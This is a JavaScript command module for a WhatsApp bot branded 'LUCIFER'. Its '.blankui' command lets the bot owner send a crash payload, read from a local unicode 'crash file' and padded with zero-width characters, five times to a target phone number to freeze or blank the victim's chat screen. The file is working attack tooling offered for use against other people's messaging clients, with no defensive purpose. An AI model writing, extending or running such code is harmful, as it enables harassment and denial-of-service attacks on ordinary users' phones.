import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const fs = require("fs");
const path = require("path");

// 🧼 Clean number
function getCleanNumber(jid) {
  return jid ? jid.replace(/\D/g, "") : null;
}

// 🔍 Resolve sender number
function resolveSenderNumber(m, conn) {
  let senderJid =
    m.key?.participant ||
    m.participant ||
    m.message?.extendedTextMessage?.contextInfo?.participant ||
    m.sender ||
    (m.key?.fromMe && conn?.user?.id) ||
    m.key?.remoteJid;

  if (!senderJid && conn?.decodeJid) {
    try {
      senderJid = conn.decodeJid(m?.key?.remoteJid);
    } catch {
      senderJid = null;
    }
  }

  return getCleanNumber(senderJid);
}

module.exports = async function ({ conn, m, args, reply, jid }) {
  try {
    const isGroup = jid.endsWith("@g.us");
    const senderNum = resolveSenderNumber(m, conn);
    if (!senderNum) return reply("❌ Unable to detect sender.");

    // 🔐 Owner verification using selfmode.json
    const configPath = path.join(__dirname, "media/selfmode.json");

    if (!fs.existsSync(configPath)) {
      return reply("⚠️ Bot is not activated. Ask the owner to run `.self`\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    let jsonData;
    try {
      jsonData = JSON.parse(fs.readFileSync(configPath));
    } catch {
      return reply("❌ Error reading `selfmode.json`. File is corrupted or missing.");
    }

    const realOwner = jsonData.owner_sender;
    if (senderNum !== realOwner) {
      return reply("🔒 *Access Denied!*\nOnly the *REAL OWNER* can launch `.blankui`\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    // 🎯 Validate number
    if (!args[0]) return reply("❌ Please provide a number.\nExample: `.blankui 923xx...`");
    const targetNum = args[0].replace(/\D/g, "");
    if (!targetNum.match(/^\d{9,15}$/)) return reply("❌ Invalid number format.");

    const targetJid = targetNum + "@s.whatsapp.net";

    // 📂 Load payload
    let unicode;
    try {
      unicode = fs.readFileSync("media/tayyabtext5.txt", "utf-8");
    } catch {
      return reply("❌ Crash file missing: `media/tayyabtext5.txt`");
    }

    const payload = "🪵 *BLANK UI ATTACK*\n\n🕳️\u200C\u200B\u200D\n\n" + unicode.repeat(1);
    const sendCount = 5;

    for (let i = 0; i < sendCount; i++) {
      try {
        await conn.sendMessage(targetJid, { text: payload }, { quoted: m });
        await new Promise((res) => setTimeout(res, 1500));
      } catch {
        return reply(`❌ Failed to send bug to ${targetNum} at attempt #${i + 1}.`);
      }
    }

    return reply(`✅ *BLANKUI attack launched on:* ${targetNum}\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓`);

  } catch (err) {
    console.error("❌ Error in blankui.js:", err);
    return reply("❌ Unexpected error occurred while running `.blankui` command.");
  }
};